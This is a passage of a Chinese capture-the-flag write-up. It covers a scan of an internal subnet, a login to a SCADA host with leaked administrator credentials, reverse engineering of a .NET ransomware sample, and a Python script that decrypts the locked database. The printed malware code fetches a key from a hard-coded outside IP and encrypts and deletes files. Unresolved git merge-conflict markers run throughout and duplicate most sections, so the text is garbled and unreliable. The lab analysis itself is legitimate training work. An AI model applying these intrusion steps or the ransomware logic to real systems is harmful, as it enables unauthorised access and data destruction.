               2 个目录 23,025,643,520 可用字节

C:\Users\Administrator\flag>type flag02.txt
  _____.__                 _______   ________
_/ ____\  | _____     ____ \   _  \  \_____  \
\   __\|  | \__  \   / ___\/  /_\  \  /  ____/
 |  |  |  |__/ __ \_/ /_/  >  \_/   \/       \
 |__|  |____(____  /\___  / \_____  /\_______ \
                 \//_____/        \/         \/

flag02: flag{931e6912-f234-426f-90c9-f644415dd121}
```

<<<<<<< HEAD
[![](assets/1710898759-b3c9c278d4225d458702c642245fd473.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104406-8fc58a48-e0e3-1.png)
=======
[![](assets/1710465426-b3c9c278d4225d458702c642245fd473.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104406-8fc58a48-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

## 172.22.26.11 - WIN-SCADA

### 工控系统接管

fscan 对 `172.22.26.213/24` 网段进行信息收集：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
./fscan -h 172.22.26.213/24 -np
-----
172.22.26.11:80 open
172.22.26.11:135 open
172.22.26.11:139 open
172.22.26.11:445 open
172.22.26.11:1433 open
[*] NetBios 172.22.26.11    WORKGROUP\WIN-SCADA           
[*] NetInfo 
[*]172.22.26.11
   [->]WIN-SCADA
   [->]172.22.26.11
[+] mssql 172.22.26.11:1433:sa 123456
[*] WebTitle http://172.22.26.11       code:200 len:703    title:IIS Windows Server
```

之前泄露的信息中已经包含了管理员账号密码：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
WIN-SCADA: 172.22.26.xx
Username: Administrator
Password: IYnT3GyCiy3
```

rdp 登录，当前账号为管理员权限，点击开关，得到 flag：

<<<<<<< HEAD
```plain
flag{bcd080d5-2cf1-4095-ac15-fa4bef9ca1c0}
```

[![](assets/1710898759-ef55abde03bafc6b62da4dbbdaf4f467.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104415-949b10d8-e0e3-1.png)

Win+D 或者 Win+M 回到桌面，发现勒索者留下的信息：

[![](assets/1710898759-a73ef801170be120a3fabe04d3c62580.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104420-981e69d0-e0e3-1.png)

最近使用的文件中发现 `ScadaDB.sql`，但是为 0 字节：

[![](assets/1710898759-6676d7345dfccb81a1bf83b00ab6a806.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104425-9a950fb6-e0e3-1.png)

因为该文件已经被加密为 `ScadaDB.sql.locky`：

[![](assets/1710898759-ec8c9999af921ff6a350345774e82f94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104430-9e02a302-e0e3-1.png)

在 C 盘下找到勒索程序 `Lockyou.exe` ：

[![](assets/1710898759-77ca000a972e8b2a4aba67e227126e5e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104434-a00e5466-e0e3-1.png)
=======
```bash
flag{bcd080d5-2cf1-4095-ac15-fa4bef9ca1c0}
```

[![](assets/1710465426-ef55abde03bafc6b62da4dbbdaf4f467.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104415-949b10d8-e0e3-1.png)

Win+D 或者 Win+M 回到桌面，发现勒索者留下的信息：

[![](assets/1710465426-a73ef801170be120a3fabe04d3c62580.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104420-981e69d0-e0e3-1.png)

最近使用的文件中发现 `ScadaDB.sql`，但是为 0 字节：

[![](assets/1710465426-6676d7345dfccb81a1bf83b00ab6a806.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104425-9a950fb6-e0e3-1.png)

因为该文件已经被加密为 `ScadaDB.sql.locky`：

[![](assets/1710465426-ec8c9999af921ff6a350345774e82f94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104430-9e02a302-e0e3-1.png)

在 C 盘下找到勒索程序 `Lockyou.exe` ：

[![](assets/1710465426-77ca000a972e8b2a4aba67e227126e5e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104434-a00e5466-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 勒索程序逆向

将加密的文件 `ScadaDB.sql.locky` 和勒索程序 `Lockyou.exe` 下载到本地进行分析。`Lockyou.exe` 为 .NET 编译，需要使用 [dnSpy](https://github.com/dnSpy/dnSpy) 或者 [dotPeek](https://www.jetbrains.com/zh-cn/decompiler/) 进行反编译：

<<<<<<< HEAD
[![](assets/1710898759-f29c9e4500ef5f449e6012775dfb3300.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104441-a41c43ba-e0e3-1.png)

通过 dotPeek 反编译 `Lockyou.exe`。在源代码中可以看到，RSA 解密得到 `AES_KEY`。

```plain
=======
[![](assets/1710465426-f29c9e4500ef5f449e6012775dfb3300.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104441-a41c43ba-e0e3-1.png)

通过 dotPeek 反编译 `Lockyou.exe`。在源代码中可以看到，RSA 解密得到 `AES_KEY`。

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
public AESCrypto()
{
  this.BACKEND_URL = "http://39.101.170.47/";
  this.PRIVATE_KEY = this.GetHttpContent(this.BACKEND_URL + "privateKey");
  this.AES_KEY_ENC = this.GetHttpContent(this.BACKEND_URL + "encryptedAesKey");
  this.AES_KEY = this.DecryptRSA(this.AES_KEY_ENC, this.PRIVATE_KEY);
}
```

<<<<<<< HEAD
[![](assets/1710898759-06b68dc0800b1c017eb3e06ca7a3c6fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104446-a794e57e-e0e3-1.png)

提示中给了两个附件，分别看一下内容：

```plain
=======
[![](assets/1710465426-06b68dc0800b1c017eb3e06ca7a3c6fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104446-a794e57e-e0e3-1.png)

提示中给了两个附件，分别看一下内容：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
encryptedAesKey # AES_KEY_ENC
privateKey  # PRIVATE_KEY
```

`encryptedAesKey` 即为 `AES_KEY_ENC`，是 Base64 字符串：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=
```

`privateKey` 即为 `PRIVATE_KEY`，是 XML 格式文件：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
<RSAKeyValue><Modulus>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=</Modulus><Exponent>AQAB</Exponent><P>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==</P><Q>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==</Q><DP>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==</DP><DQ>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==</DQ><InverseQ>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==</InverseQ><D>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=</D></RSAKeyValue>
```

根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下：

-   首先用 `privateKey` 对加密的 `encryptedAesKey` 进行 RSA 解密，得到 `AES_KEY`。
-   再用 `AES_KEY` 对加密的文件 `ScadaDB.sql.locky` 解密，得到 `ScadaDB.sql`。

### 勒索文件解密

#### RSA 解密

通过[工具](https://www.ssleye.com/ssltool/pem_xml.html)，将 `privateKey` 从 XML 格式转换为 PEM 格式，得到 `PRIVATE_KEY`：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
PHvLZB6D8zSyuGw=
-----END PRIVATE KEY-----
```

<<<<<<< HEAD
[![](assets/1710898759-6f4e52dc32fd114178057c9b37479c83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104531-c1ea0594-e0e3-1.png)

通过[工具](https://www.lddgo.net/en/encrypt/rsa)，对 `encryptedAesKey` 进行解密，得到 `AES_KEY`：

```plain
=======
[![](assets/1710465426-6f4e52dc32fd114178057c9b37479c83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104531-c1ea0594-e0e3-1.png)

通过[工具](https://www.lddgo.net/en/encrypt/rsa)，对 `encryptedAesKey` 进行解密，得到 `AES_KEY`：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
[base64]  cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=
[hex]  7258bd82a5e94eb9bb08f31c74ff534a6552cd756049bde3ad6f806a44bb6b39
```

<<<<<<< HEAD
[![](assets/1710898759-16dcc37bf8b7b66963c0e313c9be8068.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104534-c3dda004-e0e3-1.png)
=======
[![](assets/1710465426-16dcc37bf8b7b66963c0e313c9be8068.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104534-c3dda004-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

这一步也可以编程实现，见下文。

#### AES 解密

使用 `AES KEY` 对文件 `ScadaDB.sql.locky` 进行解密。RSA + AES 解密的完整脚本如下：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
# -*- coding: utf-8 -*-
# @Author  : iker
# @Time    : 2024/03/04 16:10
# @Function: RSA Privatekey Decryption & AES CBC Decryption
import base64
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5


def rsa_decrypt(data):
    private_key = """-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
PHvLZB6D8zSyuGw=
-----END PRIVATE KEY-----"""
    data = base64.b64decode(data)
    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))
    decrypted_data = priobj.decrypt(data,None)
    return decrypted_data


def padding(data):
    # style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’.
    if len(data) % AES.block_size != 0:
        return pad(data, AES.block_size, 'pkcs7')
    else:
        return data

def aes_cbc_encrypt(iv, key, data):
    key = padding(key)
    data = padding(data)
    iv = padding(iv)

    aes = AES.new(key, AES.MODE_CBC, iv)
    cipher_data = aes.encrypt(data)
    return cipher_data

def aes_cbc_decrypt(iv, key, data):
    iv = padding(iv)
    key = padding(key)
    data = padding(data)

    aes = AES.new(key, AES.MODE_CBC, iv)
    data = aes.decrypt(data)
    return data

def decrypt_file(encrypted_filepath,output_filepath,key):
    with open(encrypted_filepath, 'rb') as f:
        data = f.read()

    iv = b'\x00' * 16
    decryption_result = aes_cbc_decrypt(iv, key, data)

    with open(output_filepath, 'wb') as f:
        f.write(decryption_result)

if __name__ == "__main__":
    encryptedAesKey = "lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g="
    key = rsa_decrypt(encryptedAesKey)
    encrypted_filepath = "ScadaDB.sql.locky"
    output_filepath = "ScadaDB.sql"
    decrypt_file(encrypted_filepath,output_filepath,key)
```

解密后得到 `ScadaDB.sql`。打开数据库文件，得到 flag04：

<<<<<<< HEAD
```plain
flag{63cd8cd5-151f-4f29-bdc7-f80312888158}
```

[![](assets/1710898759-a5622a64d4bd8ffb57c550931f8b660f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104545-ca447b0c-e0e3-1.png)
=======
```bash
flag{63cd8cd5-151f-4f29-bdc7-f80312888158}
```

[![](assets/1710465426-a5622a64d4bd8ffb57c550931f8b660f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104545-ca447b0c-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

#### AES iv 补充说明

逆向勒索程序后，可以看到在 EncryptFile 函数中，先输出了长度为 16 字节的 iv，再输出了加密后的数据库文件，然后一起写入 `ScadaDB.sql.locky`：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
private void EncryptFile(string inputFile, string outputFile)
{
  using (AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider())
  {
    cryptoServiceProvider.Key = this.AES_KEY;
    cryptoServiceProvider.GenerateIV();
    using (ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor())
    {
      using (FileStream fileStream1 = new FileStream(inputFile, FileMode.Open))
      {
        using (FileStream fileStream2 = new FileStream(outputFile, FileMode.Create))
        {
          using (CryptoStream destination = new CryptoStream((Stream) fileStream2, encryptor, CryptoStreamMode.Write))
          {
            fileStream2.Write(cryptoServiceProvider.IV, 0, cryptoServiceProvider.IV.Length);
            fileStream1.CopyTo((Stream) destination);
          }
        }
      }
    }
  }
  System.IO.File.Delete(inputFile);
}
```

所以 `ScadaDB.sql.locky` 的前 16 字节实际上是 iv：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
iv = b'\xB9\x3C\x62\x85\x21\x95\x39\xE5\xC5\x00\x5A\xAA\x3A\xB0\xBF\x6C'
```

但是在本场景中，不影响解密，因为在解密时，错误的 iv 只影响明文块的第一个 16 字节 block，而在本场景中，前 16 字节恰好为 iv，不是原始 `ScadaDB.sql` 文件中的数据。
